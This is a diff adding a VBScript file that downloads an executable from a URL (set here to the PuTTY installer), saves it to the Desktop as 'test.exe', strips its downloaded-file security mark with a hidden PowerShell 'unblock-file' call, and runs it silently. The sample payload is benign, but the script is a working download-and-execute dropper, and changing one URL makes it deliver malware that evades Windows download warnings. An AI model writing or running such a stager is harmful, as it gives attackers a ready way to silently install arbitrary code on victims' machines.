@@ -1,0 +1,67 @@
+strUrl = "https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe"
+StrFile = "C:\Users\user\Desktop\test.exe"
+
+
+URL = strUrl
+saveTo = StrFile
+
+'if WScript.Arguments.Count < 1 then
+'  MsgBox "Usage: wget.vbs <url> (file)"
+'  WScript.Quit
+'end if
+
+'URL = WScript.Arguments(0)
+'if WScript.Arguments.Count > 1 then
+'  saveTo = WScript.Arguments(1)
+'else
+'  parts = split(url,"/") 
+'  saveTo = parts(ubound(parts))
+'end if
+
+
+'------------------------------------------------------------
+' Wget
+
+Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+
+objXMLHTTP.open "GET", URL, false
+objXMLHTTP.send()
+
+If objXMLHTTP.Status = 200 Then
+Set objADOStream = CreateObject("ADODB.Stream")
+objADOStream.Open
+objADOStream.Type = 1 'adTypeBinary
+
+objADOStream.Write objXMLHTTP.ResponseBody
+objADOStream.Position = 0    'Set the stream position to the start
+
+Set objFSO = Createobject("Scripting.FileSystemObject")
+If objFSO.Fileexists(saveTo) Then objFSO.DeleteFile saveTo
+Set objFSO = Nothing
+
+objADOStream.SaveToFile saveTo
+objADOStream.Close
+Set objADOStream = Nothing
+End if
+
+Set objXMLHTTP = Nothing
+
+
+
+'------------------------------------------------------------
+' Execute
+
+Set oShell = CreateObject ("Wscript.Shell")
+Dim cmd1
+Dim cmd2
+
+cmd1 = "powershell.exe -noprofile -command unblock-file -path " & StrFile
+oShell.Run cmd1, 0, false
+
+cmd2 = StrFile
+oShell.Run cmd2, 0, false
+
+
+
+' Done
+WScript.Quit
